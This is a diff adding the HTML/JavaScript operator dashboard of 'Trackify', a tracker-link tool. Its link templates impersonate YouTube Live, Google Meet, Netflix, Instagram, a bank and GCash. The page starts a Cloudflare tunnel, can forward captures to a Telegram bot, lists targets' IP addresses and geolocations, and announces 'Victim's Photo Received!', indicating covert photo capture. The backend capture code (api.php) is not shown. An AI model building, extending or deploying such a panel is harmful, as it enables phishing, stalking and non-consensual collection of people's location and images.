@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trackify - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0d1117;
+            --bg-card: #161b22;
+            --bg-input: #21262d;
+            --border: #30363d;
+            --text: #e6edf3;
+            --text-muted: #8b949e;
+            --accent: #58a6ff;
+            --accent-green: #3fb950;
+            --accent-yellow: #d29922;
+            --accent-red: #f85149;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Space Grotesk', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text);
+            min-height: 100vh;
+            background-image: radial-gradient(ellipse at top, #1a2332 0%, #0d1117 70%);
+        }
+        .layout {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            min-height: 100vh;
+        }
+        @media (max-width: 900px) {
+            .layout { grid-template-columns: 1fr; }
+        }
+        .main {
+            padding: 32px;
+            max-width: 720px;
+        }
+        .sidebar {
+            background: var(--bg-card);
+            border-left: 1px solid var(--border);
+            padding: 24px;
+            overflow-y: auto;
+        }
+        @media (max-width: 900px) {
+            .sidebar { border-left: none; border-top: 1px solid var(--border); }
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, #58a6ff, #a371f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .card h2 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--text);
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+        select, input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            margin-bottom: 16px;
+        }
+        select:focus, input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            height: 44px;
+            padding: 0 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-sizing: border-box;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #238636, #2ea043);
+            color: white;
+        }
+        .btn-primary:hover {
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+        }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-secondary {
+            background: var(--bg-input);
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+        .btn-secondary:hover {
+            background: var(--border);
+        }
+        .link-box {
+            display: flex;
+            align-items: stretch;
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .link-box .btn {
+            height: 44px;
+            min-width: 44px;
+            padding: 0 16px;
+        }
+        .link-input {
+            flex: 1;
+            height: 44px;
+            padding: 0 16px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            box-sizing: border-box;
+        }
+        .terminal {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            background: #0a0e14;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            height: 400px;
+            overflow-y: auto;
+            color: #b3b1ad;
+        }
+        .terminal-line {
+            margin-bottom: 4px;
+            word-break: break-all;
+        }
+        .terminal-line.cyan { color: #39bae6; }
+        .terminal-line.green { color: #7fd962; }
+        .terminal-line.yellow { color: #ffb454; }
+        .terminal-line.dim { color: #626a73; }
+        .terminal-line.prompt { color: #ff8f40; }
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: var(--accent);
+            animation: blink 1s step-end infinite;
+            vertical-align: -2px;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .telegram-section {
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid var(--border);
+        }
+        .telegram-section label { margin-top: 12px; }
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .status-badge.active {
+            background: rgba(63, 185, 80, 0.2);
+            color: var(--accent-green);
+        }
+        .status-badge.inactive {
+            background: rgba(248, 81, 73, 0.2);
+            color: var(--accent-red);
+        }
+        .status-badge::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+        }
+        .status-badge.inactive::before { background: var(--accent-red); }
+        .btn-danger {
+            background: rgba(248, 81, 73, 0.2);
+            color: var(--accent-red);
+            border: 1px solid var(--accent-red);
+        }
+        .btn-danger:hover {
+            background: rgba(248, 81, 73, 0.3);
+        }
+        .captures-list {
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .capture-item {
+            padding: 12px;
+            background: var(--bg-input);
+            border-radius: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+        .capture-item .ip { color: var(--accent); font-weight: 500; }
+        .capture-item .time { color: var(--text-muted); font-size: 12px; }
+        .empty-state {
+            color: var(--text-muted);
+            text-align: center;
+            padding: 32px;
+            font-size: 14px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            padding: 12px 20px;
+            background: var(--accent-green);
+            color: white;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 1000;
+        }
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="layout">
+        <main class="main">
+            <h1>Trackify</h1>
+            <p class="subtitle">IP Tracker & Geolocation — Generate tracker links and monitor captures</p>
+
+            <div class="card">
+                <h2>Generate Tracker Link</h2>
+                <label>Template</label>
+                <select id="template">
+                    <option value="1">YouTube Live</option>
+                    <option value="2" selected>Google Meet</option>
+                    <option value="3">Sensitive (Age Verification)</option>
+                    <option value="4">Netflix</option>
+                    <option value="5">Instagram</option>
+                    <option value="6">Bank</option>
+                    <option value="7">GCash</option>
+                </select>
+                <div id="ytVideoIdWrap" style="display:none">
+                    <label>YouTube Video ID</label>
+                    <input type="text" id="ytVideoId" placeholder="dQw4w9WgXcQ" value="dQw4w9WgXcQ">
+                </div>
+                <div class="telegram-section">
+                    <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
+                        <input type="checkbox" id="useTelegram">
+                        Enable Telegram notifications
+                    </label>
+                    <div id="telegramFields" style="display:none;margin-top:12px">
+                        <label>Bot Token</label>
+                        <input type="password" id="botToken" placeholder="123456:ABC...">
+                        <label>Chat ID / Username</label>
+                        <input type="text" id="chatId" placeholder="@username or -100123456">
+                    </div>
+                </div>
+                <button class="btn btn-primary" id="generateBtn" onclick="generateLink()">
+                    <span>Generate Link</span>
+                </button>
+                <div id="linkBox" class="link-box" style="display:none">
+                    <input type="text" class="link-input" id="trackerLink" readonly>
+                    <button class="btn btn-secondary" onclick="copyLink()">Copy</button>
+                    <button class="btn btn-danger" id="stopBtn" onclick="stopService()">Stop</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>Terminal</h2>
+                <div class="terminal" id="terminal">
+                    <div class="terminal-line cyan">  ╔══════════════════════════════════════════════════════════════╗</div>
+                    <div class="terminal-line cyan">  ║  <span class="green">████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗</span><span class="cyan">  ║</span></div>
+                    <div class="terminal-line cyan">  ║  <span class="green">╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝</span><span class="cyan">  ║</span></div>
+                    <div class="terminal-line cyan">  ║  <span class="green">   ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝ </span><span class="cyan">  ║</span></div>
+                    <div class="terminal-line cyan">  ║  <span class="green">   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝  </span><span class="cyan">  ║</span></div>
+                    <div class="terminal-line cyan">  ║  <span class="green">   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║   </span><span class="cyan">  ║</span></div>
+                    <div class="terminal-line cyan">  ║  <span class="green">   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   </span><span class="cyan">  ║</span></div>
+                    <div class="terminal-line cyan">  ╠══════════════════════════════════════════════════════════════╣</div>
+                    <div class="terminal-line cyan">  ║  <span class="yellow">  [*] IP TRACKER // GEOLOCATION  │  root@trackify:~#</span><span class="cyan">           ║</span></div>
+                    <div class="terminal-line cyan">  ╚══════════════════════════════════════════════════════════════╝</div>
+                    <div class="terminal-line dim" style="margin-top:12px">  Developed by: 0Cod3</div>
+                    <div class="terminal-line yellow" style="margin-top:16px">  [*] Waiting for targets, Press Ctrl + C to exit...</div>
+                    <div class="terminal-line"><span class="prompt">  root@trackify:~# </span><span class="terminal-cursor"></span></div>
+                </div>
+            </div>
+        </main>
+
+        <aside class="sidebar">
+            <div class="card">
+                <h2>Status</h2>
+                <div id="statusDisplay">
+                    <span class="status-badge inactive">Tunnel inactive</span>
+                </div>
+                <p id="statusLink" style="margin-top:12px;font-size:13px;color:var(--text-muted);word-break:break-all"></p>
+                <button class="btn btn-danger" id="stopBtnSidebar" onclick="stopService()" style="display:none;width:100%;margin-top:12px">Stop Tunnel</button>
+            </div>
+            <div class="card">
+                <h2>Recent Captures</h2>
+                <div id="capturesList" class="captures-list">
+                    <div class="empty-state">No captures yet</div>
+                </div>
+            </div>
+            <div class="card">
+                <h2>Quick Links</h2>
+                <a href="../map.php" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none;margin-bottom:8px">View Map</a>
+                <a href="../api.php" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none">API (JSON)</a>
+            </div>
+        </aside>
+    </div>
+
+    <div class="toast" id="toast">Copied to clipboard!</div>
+
+    <script>
+        const API = 'api.php';
+        const terminalEl = document.getElementById('terminal');
+        const linkBox = document.getElementById('linkBox');
+        const trackerLinkInput = document.getElementById('trackerLink');
+        const generateBtn = document.getElementById('generateBtn');
+        const statusDisplay = document.getElementById('statusDisplay');
+        const statusLink = document.getElementById('statusLink');
+        const capturesList = document.getElementById('capturesList');
+
+        document.getElementById('template').addEventListener('change', function() {
+            document.getElementById('ytVideoIdWrap').style.display = this.value === '1' ? 'block' : 'none';
+        });
+
+        document.getElementById('useTelegram').addEventListener('change', function() {
+            document.getElementById('telegramFields').style.display = this.checked ? 'block' : 'none';
+        });
+
+        function addTerminalLine(text, cls = '') {
+            const line = document.createElement('div');
+            line.className = 'terminal-line' + (cls ? ' ' + cls : '');
+            line.textContent = '  ' + text;
+            const prompt = terminalEl.querySelector('.terminal-line:last-child');
+            if (prompt) {
+                terminalEl.insertBefore(line, prompt);
+            } else {
+                terminalEl.appendChild(line);
+            }
+            terminalEl.scrollTop = terminalEl.scrollHeight;
+        }
+
+        async function generateLink() {
+            generateBtn.disabled = true;
+            generateBtn.innerHTML = '<span>Starting tunnel...</span>';
+            addTerminalLine('[+] Starting Cloudflare tunnel...', 'yellow');
+            addTerminalLine('[+] Starting php server... (localhost:3333)', 'yellow');
+
+            const formData = new FormData();
+            formData.append('template', document.getElementById('template').value);
+            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');
+            if (document.getElementById('useTelegram').checked) {
+                formData.append('telegram', '1');
+                formData.append('bot_token', document.getElementById('botToken').value);
+                formData.append('chat_id', document.getElementById('chatId').value);
+            }
+
+            try {
+                await fetch(API + '?action=start', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                addTerminalLine('[!] Error: ' + e.message, 'dim');
+                generateBtn.disabled = false;
+                generateBtn.innerHTML = '<span>Generate Link</span>';
+                return;
+            }
+
+            addTerminalLine('[+] Waiting for Cloudflare tunnel link...', 'yellow');
+            pollForLink();
+        }
+
+        async function pollForLink() {
+            for (let i = 0; i < 30; i++) {
+                await new Promise(r => setTimeout(r, 1000));
+                const res = await fetch(API + '?action=link');
+                const data = await res.json();
+                if (data.link) {
+                    linkBox.style.display = 'flex';
+                    trackerLinkInput.value = data.link;
+                    addTerminalLine('', 'green');
+                    addTerminalLine('[+] Tracker Link: ' + data.link, 'green');
+                    addTerminalLine('', 'green');
+                    addTerminalLine('[*] Waiting for targets, Press Ctrl + C to exit...', 'yellow');
+                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
+                    statusLink.textContent = data.link;
+                    document.getElementById('stopBtn').style.display = 'inline-flex';
+                    document.getElementById('stopBtnSidebar').style.display = 'block';
+                    generateBtn.disabled = false;
+                    generateBtn.innerHTML = '<span>Generate Link</span>';
+                    loadCaptures();
+                    return;
+                }
+            }
+            addTerminalLine('[!] Timeout: Could not get tunnel link', 'dim');
+            generateBtn.disabled = false;
+            generateBtn.innerHTML = '<span>Generate Link</span>';
+        }
+
+        async function stopService() {
+            const stopBtn = document.getElementById('stopBtn');
+            const stopBtnSidebar = document.getElementById('stopBtnSidebar');
+            stopBtn.disabled = true;
+            stopBtnSidebar.disabled = true;
+            try {
+                const res = await fetch(API + '?action=stop');
+                const data = await res.json();
+                if (data.status === 'success') {
+                    addTerminalLine('', 'dim');
+                    addTerminalLine('[+] Tunnel stopped.', 'dim');
+                    linkBox.style.display = 'none';
+                    trackerLinkInput.value = '';
+                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
+                    statusLink.textContent = '';
+                    stopBtn.style.display = 'none';
+                    stopBtnSidebar.style.display = 'none';
+                    const toast = document.getElementById('toast');
+                    toast.textContent = 'Tunnel stopped';
+                    toast.style.background = 'var(--accent-yellow)';
+                    toast.classList.add('show');
+                    setTimeout(() => { toast.classList.remove('show'); toast.style.background = ''; }, 2000);
+                }
+            } catch (e) {
+                addTerminalLine('[!] Error stopping: ' + e.message, 'dim');
+            }
+            stopBtn.disabled = false;
+            stopBtnSidebar.disabled = false;
+        }
+
+        function copyLink() {
+            const link = trackerLinkInput.value;
+            if (link) {
+                navigator.clipboard.writeText(link).then(() => {
+                    const toast = document.getElementById('toast');
+                    toast.textContent = 'Copied to clipboard!';
+                    toast.classList.add('show');
+                    setTimeout(() => toast.classList.remove('show'), 2000);
+                });
+            }
+        }
+
+        async function loadCaptures() {
+            try {
+                const res = await fetch(API + '?action=captures');
+                const data = await res.json();
+                if (data.status === 'success' && data.data) {
+                    const geo = data.data.geolocations || [];
+                    const ips = data.data.ips || [];
+                    const all = [...geo.map(g => ({
+                        ip: g.ip,
+                        time: g.timestamp,
+                        loc: (g.geo && (g.geo.location || g.geo.city)) || g.location || g.city
+                    })), ...ips];
+                    all.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
+                    if (all.length === 0) {
+                        capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
+                    } else {
+                        capturesList.innerHTML = all.slice(0, 10).map(c => `
+                            <div class="capture-item">
+                                <span class="ip">${c.ip || 'N/A'}</span>
+                                ${c.loc ? '<br><span class="dim">' + c.loc + '</span>' : ''}
+                                <div class="time">${c.time || ''}</div>
+                            </div>
+                        `).join('');
+                    }
+                }
+            } catch (e) {}
+        }
+
+        async function checkStatus() {
+            try {
+                const res = await fetch(API + '?action=status');
+                const data = await res.json();
+                if (data.link) {
+                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
+                    statusLink.textContent = data.link;
+                    linkBox.style.display = 'flex';
+                    trackerLinkInput.value = data.link;
+                    document.getElementById('stopBtn').style.display = 'inline-flex';
+                    document.getElementById('stopBtnSidebar').style.display = 'block';
+                } else {
+                    document.getElementById('stopBtn').style.display = 'none';
+                    document.getElementById('stopBtnSidebar').style.display = 'none';
+                }
+            } catch (e) {}
+        }
+
+        let lastTerminalEvents = [];
+        async function pollTerminalEvents() {
+            try {
+                const res = await fetch(API + '?action=terminal');
+                const data = await res.json();
+                if (data.events && data.events.length > 0) {
+                    for (const ev of data.events) {
+                        if (lastTerminalEvents.includes(ev.type + ev.content)) continue;
+                        lastTerminalEvents.push(ev.type + ev.content);
+                        if (ev.type === 'location') {
+                            addTerminalLine('', 'green');
+                            addTerminalLine('[+] New Target Opened the Link!', 'green');
+                            ev.content.split('\n').forEach(l => l.trim() && addTerminalLine(l, 'cyan'));
+                        } else if (ev.type === 'ip') {
+                            addTerminalLine('', 'green');
+                            addTerminalLine('[+] Target opened the link!', 'green');
+                            ev.content.split('\n').forEach(l => l.trim() && addTerminalLine(l, 'cyan'));
+                        } else if (ev.type === 'photo') {
+                            addTerminalLine('', 'green');
+                            addTerminalLine('[+] Victim\'s Photo Received!', 'green');
+                        }
+                    }
+                }
+            } catch (e) {}
+        }
+
+        setInterval(loadCaptures, 5000);
+        setInterval(checkStatus, 10000);
+        setInterval(pollTerminalEvents, 2000);
+        checkStatus();
+    </script>
+</body>
+</html>
